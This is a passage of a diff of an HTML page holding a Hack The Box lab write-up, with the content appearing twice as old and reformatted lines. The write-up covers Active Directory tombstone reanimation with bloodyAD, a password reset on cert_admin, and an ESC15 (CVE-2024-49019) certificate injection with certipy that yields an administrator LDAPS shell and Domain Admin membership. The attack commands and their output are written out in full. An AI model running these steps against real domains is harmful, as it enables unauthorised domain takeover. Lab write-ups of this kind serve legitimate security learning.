-</span></span></code></pre></div><p>One thing worth calling out: SharpHound does not collect deleted objects even when run as Domain Admin, despite documentation suggesting it might. BloodHound CE has no visibility into the tombstone container. This entire escalation path, Reanimate-Tombstones feeding GenericAll via OU inheritance, is completely blind to standard BloodHound collection.</p><h2 id=esc15-via-cert_admin>ESC15 via cert_admin</h2><p>Running certipy again after restoring with the correct SID, the template output changed. The unresolved SID resolved to <code>cert_admin</code>, and a vulnerability was flagged:</p><pre tabindex=0><code>Template Name                 : WebServer
+</code></pre><p>That SID didn&rsquo;t resolve to cert_admin. The issue: I restored the object by sAMAccountName, which grabbed whichever tombstone came first. The template&rsquo;s enrollment rights reference a specific SID (ending in <code>-1111</code>). The object I restored had a different SID:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  get object cert_admin --attr objectSid
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">objectSid: S-1-5-21-1392491010-1358638721-2126982587-1109
+</span></span></code></pre></div><p>Wrong one. There were multiple <code>cert_admin</code> tombstones. Querying the deleted objects container again for all remaining tombstones and their SIDs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -D <span class="s2">&#34;john@tombwatcher.htb&#34;</span> -w <span class="s1">&#39;Kanyo123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -b <span class="s1">&#39;CN=Deleted Objects,DC=tombwatcher,DC=htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -E <span class="s1">&#39;!1.2.840.113556.1.4.417&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s1">&#39;(isDeleted=TRUE)&#39;</span> dn sAMAccountName objectSid lastKnownParent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># cert_admin DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358</span>
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>cert_admin<span class="se">\0</span>ADEL:c1f1f0fe-...
+</span></span><span class="line"><span class="cl">sAMAccountName: cert_admin
+</span></span><span class="line"><span class="cl">objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VgQAAA<span class="o">==</span>
+</span></span><span class="line"><span class="cl">lastKnownParent: <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># cert_admin DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>cert_admin<span class="se">\0</span>ADEL:938182c3-...
+</span></span><span class="line"><span class="cl">sAMAccountName: cert_admin
+</span></span><span class="line"><span class="cl">objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VwQAAA<span class="o">==</span>
+</span></span><span class="line"><span class="cl">lastKnownParent: <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span></code></pre></div><p>The base64-encoded SIDs decode to RIDs 1110 and 1111 respectively. The second one is the match. Delete the incorrectly restored object and restore by SID this time:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  remove object <span class="s1">&#39;CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="nv">CN</span><span class="o">=</span>cert_admin,OU<span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb has been removed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> restore <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-1111&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> S-1-5-21-1392491010-1358638721-2126982587-1111 has been restored successfully
+</span></span><span class="line"><span class="cl">    under <span class="nv">CN</span><span class="o">=</span>cert_admin,OU<span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+</span></span></code></pre></div><p>Certipy now resolved the SID to <code>cert_admin</code>. GenericAll from the OU ACE inherits immediately. Reset cert_admin&rsquo;s password directly:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -u john -p <span class="s1">&#39;Kanyo123!&#39;</span> -d tombwatcher.htb --host <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> password cert_admin <span class="s1">&#39;Kanyo123!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
+</span></span></code></pre></div><p>One thing worth calling out: SharpHound does not collect deleted objects even when run as Domain Admin, despite documentation suggesting it might. BloodHound CE has no visibility into the tombstone container. This entire escalation path, Reanimate-Tombstones feeding GenericAll via OU inheritance, is completely blind to standard BloodHound collection.</p>
+<h2 id="esc15-via-cert_admin">ESC15 via cert_admin</h2>
+<p>Running certipy again after restoring with the correct SID, the template output changed. The unresolved SID resolved to <code>cert_admin</code>, and a vulnerability was flagged:</p>
+<pre tabindex="0"><code>Template Name                 : WebServer
 Display Name                  : Web Server
 Certificate Authorities       : tombwatcher-CA-1
 Enabled                       : True
@@ -164,37 +407,197 @@ Permissions
 [*] Remarks
   ESC15                       : Only applicable if the environment has not been patched.
                                 See CVE-2024-49019 or the wiki for more details.
-</code></pre><p>ESC15 is CVE-2024-49019. The vulnerability lives in how schema version 1 certificate templates handle the relationship between two certificate extensions: Extended Key Usage (EKU) and Application Policies.</p><p>Normally, EKU determines what a certificate can be used for. But schema v1 templates have a quirk: if a certificate request includes an Application Policies extension, certain Windows components will prefer it over EKU. Specifically, Schannel, the Windows TLS stack used for LDAPS, follows Microsoft&rsquo;s own documented behavior:</p><blockquote><p><em>&ldquo;If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored.&rdquo;</em></p></blockquote><p>The attack: request a certificate from the WebServer template (EKU: Server Authentication), but inject <code>Client Authentication</code> into the Application Policies extension via certipy&rsquo;s <code>-application-policies</code> flag. The CA issues it because the template policy allows it. Schannel then accepts it for client authentication.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req -u cert_admin@tombwatcher.htb -p <span class=s1>&#39;Kanyo123!&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -dc-ip <span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -ca tombwatcher-CA-1 <span class=se>\
-</span></span></span><span class=line><span class=cl>  -template WebServer <span class=se>\
-</span></span></span><span class=line><span class=cl>  -upn administrator@tombwatcher.htb <span class=se>\
-</span></span></span><span class=line><span class=cl>  -application-policies <span class=s1>&#39;Client Authentication&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting certificate via RPC
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Successfully requested certificate
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got certificate with UPN <span class=s1>&#39;administrator@tombwatcher.htb&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate has no object SID
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Try using -sid to <span class=nb>set</span> the object SID or see the wiki <span class=k>for</span> more details
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving certificate and private key to <span class=s1>&#39;administrator.pfx&#39;</span>
-</span></span></code></pre></div><p>PKINIT won&rsquo;t work with this certificate. Kerberos pre-authentication checks the EKU extension strictly. It sees <code>Server Authentication</code>, finds no <code>Client Authentication</code> there, and returns <code>KDC_ERR_INCONSISTENT_KEY_PURPOSE</code>. It never consults Application Policies. The path in is LDAPS via Schannel instead:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span> -ldap-shell
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Certificate identities:
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     SAN UPN: <span class=s1>&#39;administrator@tombwatcher.htb&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     SAN URL SID: <span class=s1>&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     Security Extension SID: <span class=s1>&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Connecting to <span class=s1>&#39;ldaps://10.129.232.167:636&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Authenticated to <span class=s1>&#39;10.129.232.167&#39;</span> as: <span class=s1>&#39;u:TOMBWATCHER\\Administrator&#39;</span>
-</span></span><span class=line><span class=cl>Type <span class=nb>help</span> <span class=k>for</span> list of commands
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># add_user_to_group john &#39;Domain Admins&#39;</span>
-</span></span><span class=line><span class=cl>Adding user: john to group Domain Admins result: OK
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># add_user_to_group john &#39;Enterprise Admins&#39;</span>
-</span></span><span class=line><span class=cl>Adding user: john to group Enterprise Admins result: OK
-</span></span></code></pre></div><p><em>I ran into LDAPS-specific issues with the certipy library and had to modify the certipy LDAP wrapper to roll back to a more permissive OpenSSL version. If the LDAP shell hangs on the TLS handshake, that&rsquo;s where to look.</em></p><p>Domain Admin. Root flag.</p><h2 id=references>References</h2><ul><li><a href=https://cravaterouge.com/articles/ad-bin/#privilege-escalation-vectors>AD Bin - Privilege Escalation Vectors</a></li><li><a href=https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu>Certipy Wiki - ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019)</a></li><li><a href=https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc>TrustedSec - EKUWU: Not Just Another AD CS ESC</a></li><li><a href=https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760>ADCS Exploitation Series Part 2: Certificate Mapping ESC15</a></li></ul></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
-<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
-<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
-<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
+</code></pre><p>ESC15 is CVE-2024-49019. The vulnerability lives in how schema version 1 certificate templates handle the relationship between two certificate extensions: Extended Key Usage (EKU) and Application Policies.</p>
+<p>Normally, EKU determines what a certificate can be used for. But schema v1 templates have a quirk: if a certificate request includes an Application Policies extension, certain Windows components will prefer it over EKU. Specifically, Schannel, the Windows TLS stack used for LDAPS, follows Microsoft&rsquo;s own documented behavior:</p>
+<blockquote>
+<p><em>&ldquo;If a certificate has an extension containing an application policy and also has an EKU extension, the EKU extension is ignored.&rdquo;</em></p>
+</blockquote>
+<p>The attack: request a certificate from the WebServer template (EKU: Server Authentication), but inject <code>Client Authentication</code> into the Application Policies extension via certipy&rsquo;s <code>-application-policies</code> flag. The CA issues it because the template policy allows it. Schannel then accepts it for client authentication.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -u cert_admin@tombwatcher.htb -p <span class="s1">&#39;Kanyo123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -ca tombwatcher-CA-1 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -template WebServer <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -upn administrator@tombwatcher.htb <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -application-policies <span class="s1">&#39;Client Authentication&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;administrator@tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try using -sid to <span class="nb">set</span> the object SID or see the wiki <span class="k">for</span> more details
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><p>PKINIT won&rsquo;t work with this certificate. Kerberos pre-authentication checks the EKU extension strictly. It sees <code>Server Authentication</code>, finds no <code>Client Authentication</code> there, and returns <code>KDC_ERR_INCONSISTENT_KEY_PURPOSE</code>. It never consults Application Policies. The path in is LDAPS via Schannel instead:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span> -ldap-shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate identities:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     SAN UPN: <span class="s1">&#39;administrator@tombwatcher.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     SAN URL SID: <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Security Extension SID: <span class="s1">&#39;S-1-5-21-1392491010-1358638721-2126982587-500&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting to <span class="s1">&#39;ldaps://10.129.232.167:636&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Authenticated to <span class="s1">&#39;10.129.232.167&#39;</span> as: <span class="s1">&#39;u:TOMBWATCHER\\Administrator&#39;</span>
+</span></span><span class="line"><span class="cl">Type <span class="nb">help</span> <span class="k">for</span> list of commands
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># add_user_to_group john &#39;Domain Admins&#39;</span>
+</span></span><span class="line"><span class="cl">Adding user: john to group Domain Admins result: OK
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># add_user_to_group john &#39;Enterprise Admins&#39;</span>
+</span></span><span class="line"><span class="cl">Adding user: john to group Enterprise Admins result: OK
+</span></span></code></pre></div><p><em>I ran into LDAPS-specific issues with the certipy library and had to modify the certipy LDAP wrapper to roll back to a more permissive OpenSSL version. If the LDAP shell hangs on the TLS handshake, that&rsquo;s where to look.</em></p>
+<p>Domain Admin. Root flag.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://cravaterouge.com/articles/ad-bin/#privilege-escalation-vectors">AD Bin - Privilege Escalation Vectors</a></li>
+<li><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu">Certipy Wiki - ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019)</a></li>
+<li><a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">TrustedSec - EKUWU: Not Just Another AD CS ESC</a></li>
+<li><a href="https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760">ADCS Exploitation Series Part 2: Certificate Mapping ESC15</a></li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
